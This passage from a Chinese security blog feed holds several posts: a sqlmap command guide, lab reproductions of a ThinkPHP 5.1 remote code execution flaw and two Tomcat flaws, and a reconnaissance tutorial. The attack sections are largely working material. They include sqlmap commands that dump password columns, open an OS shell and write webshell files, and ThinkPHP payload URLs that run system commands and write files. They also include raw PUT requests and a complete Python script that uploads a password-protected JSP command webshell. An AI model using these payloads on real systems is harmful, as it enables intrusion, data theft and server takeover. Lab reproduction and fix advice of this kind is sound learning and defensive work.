<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a></p>
<p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p>
<h4 id="自动的搜索"><a href="#自动的搜索" class="headerlink" title="自动的搜索"></a>自动的搜索</h4><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms</code></p>
<h4 id="指定参数搜索"><a href="#指定参数搜索" class="headerlink" title="指定参数搜索"></a>指定参数搜索</h4><p><code>sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data &quot;tfUName=321&amp;tfUPass=321&quot;</code></p>
<h3 id="SQLMAP中Google搜索注入"><a href="#SQLMAP中Google搜索注入" class="headerlink" title="SQLMAP中Google搜索注入"></a>SQLMAP中Google搜索注入</h3><p>inurl后面的语言是由自己定的<br>注入过程中如果选y是注入，如果不是选n</p>
<p><code>sqlmap -g inurl:php?id=</code></p>
<h3 id="SQLMAP中的请求延迟"><a href="#SQLMAP中的请求延迟" class="headerlink" title="SQLMAP中的请求延迟"></a>SQLMAP中的请求延迟</h3><p>参数 –delay –safe-freq</p>
<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1</code></p>
<p><code>python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</code></p>
<h3 id="SQLMAP绕过WAF防火墙"><a href="#SQLMAP绕过WAF防火墙" class="headerlink" title="SQLMAP绕过WAF防火墙"></a>SQLMAP绕过WAF防火墙</h3><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a></p>
<p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</code></p>
<p><code>space2morehash.py</code>中可以替换<code>space2hash.py</code>或者<code>base64encode.py</code>或者<code>charencode.py</code>都是编码方式</p>
<h3 id="SQLMAP查看权限"><a href="#SQLMAP查看权限" class="headerlink" title="SQLMAP查看权限"></a>SQLMAP查看权限</h3><p><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges</code></p>
<h3 id="SQLMAP伪静态注入"><a href="#SQLMAP伪静态注入" class="headerlink" title="SQLMAP伪静态注入"></a>SQLMAP伪静态注入</h3><ul>
<li><p>查找数据库<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --dbs</code></p>
</li>
<li><p>通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname --tables</code></p>
</li>
<li><p>通过2中的数据表得到字段(假如得到的是tablename表)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
tablename --columns</code></p>
</li>
<li><p>通过3得到字段值(假如从3中得到字段id，password)<br><code>python sqlmap.py -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -T
tablename -C &quot;password&quot; --dump</code></p>
</li>
</ul>
<h3 id="SQLMAP注入点执行命令与交互写shell"><a href="#SQLMAP注入点执行命令与交互写shell" class="headerlink" title="SQLMAP注入点执行命令与交互写shell"></a>SQLMAP注入点执行命令与交互写shell</h3><ul>
<li><p>注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br>此处采用的是Linux系统<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/ </p>
</li>
<li><p>获取Shell<br><code>sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell</code><br>出现语言的选择根据实际的测试网站选择语言<br>指定目标站点D:/www/<br>输入ipconfig/all<br>创建用户和删除用户<br>只要权限足够大，你可以输入使用任何命令。<br>其他命令参考下面：<br>从数据库中搜索字段<br><code>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</code></p>
</li>
</ul>
<p>在dedecms数据库中搜索字段<code>admin</code>或者<code>password</code>。</p>
<p>读取与写入文件</p>
<p>首先找需要网站的物理路径，其次需要有可写或可读权限。<br><code>–file-read=RFILE</code> 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
<p><code>–file-write=WFILE</code> 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
<p><code>–file-dest=DFILE</code> 后端的数据库管理系统写入文件的绝对路径</p>
<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p><code>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</code></p>
<p>使用shell命令：<br><code>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</code></p>
<p>接下来指定网站可写目录：<br><code>“E:\php\htdocs\dvwa”</code></p>
<ul>
<li>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</li>
</ul>
<h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><ul>
<li><p>-is-dba 当前用户权限（是否为root权限）</p>
</li>
<li><p>-dbs 所有数据库</p>
</li>
<li><p>-current-db 网站当前数据库</p>
</li>
<li><p>-users 所有数据库用户</p>
</li>
<li><p>-current-user 当前数据库用户</p>
</li>
<li><p>-random-agent 构造随机user-agent</p>
</li>
<li><p>-passwords 数据库密码</p>
</li>
<li><p>-proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</p>
</li>
<li><p>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkPHP5.1漏洞复现</title>
    <url>/posts/36430.html</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>。。。</p>
<h2 id="0x01-docker复现"><a href="#0x01-docker复现" class="headerlink" title="0x01 docker复现"></a>0x01 docker复现</h2><p>这一块弄了好几天，一直不会用docker复现cms。</p>
<p>利用官方lamp镜像，一开始用的镜像的PHP版本是5.5的，但是thinkPHP5.1需要PHP5.6以上，一直没有成功，后来换了一个镜像PHP7.3的，成功了！！！</p>
<ol>
<li>搜索lamp镜像<br><code>docker search lamp</code></li>
<li>拉取镜像<br><code>docker pull mattrayner/lamp</code></li>
<li>新建docker容器，并映射端口号<br><code>docker run -d -p [host port]:[docker port][image]</code></li>
<li>查看运行中的docker容器<br><code>docker ps -a</code></li>
<li>进入一个docker容器<br><code>docker exec -it [container id] bash</code></li>
<li>拷贝本地文件到docker<br><code>docker cp [本地路径] [container id]:[container 路径]</code></li>
<li>启动服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="0x02-命令执行漏洞利用"><a href="#0x02-命令执行漏洞利用" class="headerlink" title="0x02 命令执行漏洞利用"></a>0x02 命令执行漏洞利用</h2><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thinkPHP5.1.1</span><br><span class="line">php 7.3 (必须5.6+)</span><br><span class="line">靶机IP： 192.168.72.131:89</span><br></pre></td></tr></table></figure>

<h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code></p>
<p><img src="/posts/36430/0.png" alt></p>
<p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p>
<p><img src="/posts/36430/4.png" alt></p>
<h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p><code>http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=ls%20-l</code></p>
<p><img src="/posts/36430/2.png" alt></p>
<p><code>http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=whoami</code><br><img src="/posts/36430/3.png" alt></p>
<h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="文件写入："></a>文件写入：</h3><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=%3C?php%20phpinfo();?%3E</code></p>
<p>访问：<br><code>http://192.168.72.131:89/tp5.1/public/shell.php</code></p>
<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><ol>
<li>更新thinkPHP版本</li>
<li>手工修复<br>根据官方给出的方案进行代码修改。<br><a href="https://github.com/top-think/framework/commit/f0f9fc71b8b3716bd2abdf9518bcdf1897bb776" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/f0f9fc71b8b3716bd2abdf9518bcdf1897bb776</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat复现之弱口令&amp;后台getshell</title>
    <url>/posts/30841.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>漏洞地址： <a href="http://192.168.220.141:8080/manager/html" target="_blank" rel="noopener">http://192.168.220.141:8080/manager/html</a></p>
<p>输入用户名： tomcat<br>密码： tomcat</p>
<p>进入后台</p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><ol>
<li><p>制作war包</p>
<p>将木马打包成压缩包文件，修改后缀名为war</p>
</li>
<li><p>上传war包</p>
<p><img src="/posts/30841/1.png" alt="上传war包"></p>
</li>
<li><p>输入密码，get shell！！！</p>
<p><img src="/posts/30841/2.png" alt="get shell"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat复现之远程代码执行漏洞</title>
    <url>/posts/21635.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（默认关闭），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
<h3 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tomcat 7.0.0 - 7.0.81</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 Tomcat 安装目录下的配置文件web.xml中，如果有如下代码，则表示Tomcat已开启  PUT 方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br></pre></td></tr></table></figure>
<p>确保readonly参数为true（默认值），即不允许DELETE和PUT操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span><br><span class="line">&lt;!--                       commands like PUT and DELETE are               --&gt;</span><br><span class="line">&lt;!--                       rejected?  [true]                              --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上传webshell</p>
<h3 id="Burpsuite抓包"><a href="#Burpsuite抓包" class="headerlink" title="Burpsuite抓包"></a>Burpsuite抓包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br></pre></td></tr></table></figure>

<p>将上面的 GET 方法改为 PUT ，后面写要创建的webshell名，下面传入webshell的内容</p>
<p>有下面几种方法：</p>
<p><strong>/xxx.jsp/</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp&#x2F;  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
<p><img src="/posts/21635/1.png" alt="xxx.jsp/"></p>
<p>这种方法是服务器会把最后的 <code>/</code> 去掉 </p>
<p><strong>/xxx.jsp%20</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp%20  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
<p>其中 %20 为url编码，实际是指 (空格)</p>
<p><img src="/posts/21635/2.png" alt="xxx.jsp%20"></p>
<p><strong>/xxx.jsp::$DATA</strong>(没有实现)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp::$DATA  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
<p><img src="/posts/21635/3.png" alt="::$DATA"></p>
<p>使用这种方法也可以上传成功，但是却不能被解析，上传的文件名为 123.jsp::$DATA</p>
<p><strong>执行结果：</strong></p>
<p><img src="/posts/21635/4.png" alt="命令执行"></p>
<h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p>脚本(基于python2)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! -*- coding:utf-8 -*- </span><br><span class="line"></span><br><span class="line">import httplib</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">body &#x3D; &#39;&#39;&#39;&lt;%@ page language&#x3D;&quot;java&quot; import&#x3D;&quot;java.util.*,java.io.*&quot; pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line &#x3D; new StringBuilder();try &#123;Process pro &#x3D; Runtime.getRuntime().exec(c);BufferedReader buf &#x3D; new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp &#x3D; null;while ((temp &#x3D; buf.readLine()) !&#x3D; null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;&#x2F;pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">    conn &#x3D; httplib.HTTPConnection(sys.argv[1])</span><br><span class="line"></span><br><span class="line">    conn.request(method&#x3D;&#39;OPTIONS&#39;, url&#x3D;&#39;&#x2F;ffffzz&#39;)</span><br><span class="line"></span><br><span class="line">    headers &#x3D; dict(conn.getresponse().getheaders())</span><br><span class="line"></span><br><span class="line">    if &#39;allow&#39; in headers and headers[&#39;allow&#39;].find(&#39;PUT&#39;) &gt; 0 :</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        conn &#x3D; httplib.HTTPConnection(sys.argv[1])</span><br><span class="line"></span><br><span class="line">        url &#x3D; &quot;&#x2F;&quot; + str(int(time.time()))+&#39;.jsp&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">        #url &#x3D; &quot;&#x2F;&quot; + str(int(time.time()))+&#39;.jsp::$DATA&#39;</span><br><span class="line"></span><br><span class="line">        conn.request( method&#x3D;&#39;PUT&#39;, url&#x3D; url, body&#x3D;body)</span><br><span class="line"></span><br><span class="line">        res &#x3D; conn.getresponse()</span><br><span class="line"></span><br><span class="line">        if res.status  &#x3D;&#x3D; 201 :</span><br><span class="line"></span><br><span class="line">            #print &#39;shell:&#39;, &#39;http:&#x2F;&#x2F;&#39; + sys.argv[1] + url[:-7]</span><br><span class="line"></span><br><span class="line">            print &#39;shell:&#39;, &#39;http:&#x2F;&#x2F;&#39; + sys.argv[1] + url[:-1]</span><br><span class="line"></span><br><span class="line">        elif res.status &#x3D;&#x3D; 204 :</span><br><span class="line"></span><br><span class="line">            print &#39;file exists&#39;</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line"></span><br><span class="line">            print &#39;error&#39;</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        print &#39;Server not vulnerable&#39;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">except Exception,e:</span><br><span class="line"></span><br><span class="line">    print &#39;Error:&#39;, e</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\l1395\Desktop&gt;python2 test.py 192.168.220.141:8080</span><br><span class="line">shell: http:&#x2F;&#x2F;192.168.220.141:8080&#x2F;1564383217.jsp</span><br></pre></td></tr></table></figure>
<p><img src="/posts/21635/5.png" alt="命令执行"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。</p>
<p>根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险； 注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>《渗透测试之信息收集》</title>
    <url>/posts/25470.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习渗透测试，先从最基本的开始吧。<br>在进行渗透测试之前，最重要的就是信息收集，我们要尽可能地收集目标的信息，越详细越好。</p>
<h1 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h1><p>知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，包括该域名的DNS服务器信息和注册人的联系信息等。</p>
<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p>whois是一个标准的互联网协议，可用于收集网络注册信息，注册的域名，IP地址等信息。</p>
<p>Kali下默认安装whois</p>
<p><code>whois 域名</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# whois sec-redclub.com</span><br><span class="line">   Domain Name: SEC-REDCLUB.COM</span><br><span class="line">   Registry Domain ID: 1984718078_DOMAIN_COM-VRSN</span><br><span class="line">   Registrar WHOIS Server: grs-whois.hichina.com</span><br><span class="line">   Registrar URL: http:&#x2F;&#x2F;www.net.cn</span><br><span class="line">   Updated Date: 2018-10-22T02:22:15Z</span><br><span class="line">   Creation Date: 2015-11-30T08:45:51Z</span><br><span class="line">   Registry Expiry Date: 2019-11-30T08:45:51Z</span><br><span class="line">   Registrar: Alibaba Cloud Computing (Beijing) Co., Ltd.</span><br><span class="line">   Registrar IANA ID: 420</span><br><span class="line">   Registrar Abuse Contact Email: DomainAbuse@service.aliyun.com</span><br><span class="line">   Registrar Abuse Contact Phone: +86.95187</span><br><span class="line">   Domain Status: ok https:&#x2F;&#x2F;icann.org&#x2F;epp#ok</span><br><span class="line">   Name Server: DNS10.HICHINA.COM</span><br><span class="line">   Name Server: DNS9.HICHINA.COM</span><br><span class="line">   DNSSEC: unsigned</span><br></pre></td></tr></table></figure>

<p>在线whois查询的常用网站有：<br><a href="http://whois.aizhan.com" target="_blank" rel="noopener" title="爱站工具网">爱站工具网</a><br><a href="http://whois.chinaz.com" target="_blank" rel="noopener" title="站长之家">站长之家</a><br><a href="http://www.virustotal.com" target="_blank" rel="noopener" title="VirusTotal">VirusTotal</a></p>
<h2 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h2><p>主要针对国内网站，如果网站搭建在国外，则不需要备案。</p>
<p>常用的网站：</p>
<p><a href="http://www.beianbeian.com" target="_blank" rel="noopener" title="ICP备案查询网">ICP备案查询网</a><br><a href="http://www.tianyancha.com" target="_blank" rel="noopener" title="天眼查">天眼查</a></p>
<h1 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h1><p>Google Hacking语法</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Site</td>
<td>指定域名</td>
</tr>
<tr>
<td>Intext</td>
<td>网页正文中的关键字</td>
</tr>
<tr>
<td>Inurl</td>
<td>URL中存在关键字的网页</td>
</tr>
<tr>
<td>Filetype</td>
<td>指定文件类型</td>
</tr>
<tr>
<td>Intitle</td>
<td>网页标题中的关键字</td>
</tr>
<tr>
<td>link</td>
<td>link:baidu.com 即表示返回所有和baidu.com做了链接的URL</td>
</tr>
<tr>
<td>Info</td>
<td>查找指定站点的一些基本信息</td>
</tr>
<tr>
<td>cache</td>
<td>搜索Google里关于某些内容的缓存</td>
</tr>
</tbody></table>
<p>举个例子：<br>尝试搜索学校网站的后台，语法为：<code>Site:edu.cn intext:后台管理</code></p>
<p>意思为搜索网页正文中含有“后台管理”并且域名后缀是edu.cn的网站</p>
<p><img src="/posts/25470/1.png" alt="Googel hacking"></p>
<p>不仅是Google搜索引擎，还有百度、雅虎、Bing、Shodan等，语法大同小异。</p>
<p>还有，通过Burpsuite的Repeater也可以获取一些服务器的信息，如服务器的server类型及版本，PHP的版本信息等。</p>
<p><img src="/posts/25470/2.png" alt="Repeater"></p>
<h1 id="收集子域名信息"><a href="#收集子域名信息" class="headerlink" title="收集子域名信息"></a>收集子域名信息</h1><p>子域名也就是二级域名，是指顶级域名下的域名。如果我们的目标网络规模比较大，直接从主域入手难度太大，所有不如先从目标的某个子域入手，再想办法接近目标。</p>
<h2 id="子域名检测工具"><a href="#子域名检测工具" class="headerlink" title="子域名检测工具"></a>子域名检测工具</h2><p>用于子域名检测的工具有很多，比如，Layer子域名挖掘机、wydomain、Sublist3r、dnsmaper、subDomainsBrute等等。</p>
<ul>
<li><p>Layer子域名挖掘机</p>
<p>直接输入域名进行扫描</p>
<p><img src="/posts/25470/3.png" alt="Layer"></p>
</li>
<li><p>subDomainsBrute</p>
<p>可以用小字典递归地发现三级、四级，甚至五级域名等不容易被探测到的域名</p>
<p>执行命令：</p>
<p><code>python subDomainsbrute.py xxx.com</code></p>
</li>
<li><p>Sublist3r</p>
<p>列举多种资源，如在Google、Bing、Baidu等搜索引擎中查到的子域名，还可以列出VirusTotal、DNSdumpster等查到的子域名</p>
</li>
</ul>
<h2 id="搜索引擎枚举"><a href="#搜索引擎枚举" class="headerlink" title="搜索引擎枚举"></a>搜索引擎枚举</h2><p>可以利用Google语法搜索子域名，例如搜索Baidu的子域名，使用<code>site:baidu.com</code></p>
<p><img src="/posts/25470/4.png" alt></p>
<h1 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h1><p>通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务，便于渗透目标服务器。</p>
<p>最常见的工具就是nmap，还有Masscan、ZMap等工具。</p>
<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><p>这里的指纹是指网站cms指纹识别、计算机操作系统及web容器的指纹识别等。</p>
<p>应用程序一般在html、js、css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中包含generator=wordpress 3.xx，这个特征就是cms的指纹。当碰到这些特征时，就可以快速识别出该cms，所以叫指纹识别。</p>
<p>常见的cms有dedecms(织梦)、discuz、PHPWEB、PHPCMS、帝国、WordPress等。</p>
<p>常用的工具有：御剑web指纹识别、WhatWeb、WebRobo、轻量WEB指纹识别等。</p>
<p>除了这些工具，还有一些在线网站查询cms指纹识别</p>
<p>BugScaner: <a href="http://whatweb.bugscaner.com/look" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look</a></p>
<p>云悉指纹: <a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p>
<p>whatweb: <a href="https://whatweb.net" target="_blank" rel="noopener">https://whatweb.net</a></p>
<h1 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h1><p>如果目标服务器不存在CDN，可以直接通过<a href="http://www.ip138.com获取目标的一些IP及域名信息。如果目标服务器存在CDN，如何让CDN找到目标服务器的真实IP呢？？？">www.ip138.com获取目标的一些IP及域名信息。如果目标服务器存在CDN，如何让CDN找到目标服务器的真实IP呢？？？</a></p>
<h2 id="目标服务器存在CDN"><a href="#目标服务器存在CDN" class="headerlink" title="目标服务器存在CDN"></a>目标服务器存在CDN</h2><p>什么是CDN呢？ CDN就是内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。</p>
<p>所以如果目标服务器使用了CDN，可以直接ping目标的域名，但得到的并不是真正的目标服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我们无法直接得到目标的真实IP。</p>
